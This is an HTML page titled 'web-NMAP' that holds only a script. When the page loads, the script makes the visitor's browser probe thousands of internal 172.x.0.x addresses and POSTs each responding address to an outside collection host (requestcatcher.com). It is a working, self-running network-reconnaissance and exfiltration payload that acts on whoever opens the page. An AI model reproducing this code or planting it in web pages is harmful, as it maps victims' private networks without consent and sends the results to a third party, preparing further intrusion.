<!DOCTYPE html>
<html>

<head>
    <title>web-NMAP</title>
    <meta charset="utf-8">
</head>

<body>

    <script>
        'use strict'

        let ips = []
        function sendInfo(ip) {
            fetch(`https://l.requestcatcher.com/${ip}`, {
                method: 'POST',
                mode: 'no-cors',
                signal: AbortSignal.timeout(3000),
                headers: {
                    'Content-Type': 'application/json;charset=utf-8'
                },
                body: JSON.stringify({ ip: ip })
            });
        }
        function scan() {
            for (let subnet = 0; subnet < 100; ++subnet) {
                for (let device = 0; device < 100; ++device) {

                    let address = `http://172.${subnet}.0.${device}`;

                    fetch(address, { mode: 'no-cors' })
                        .then(resp => {
                            sendInfo(address)
                        })
                }
            }
        }
        scan();
    </script>
</body>

</html>
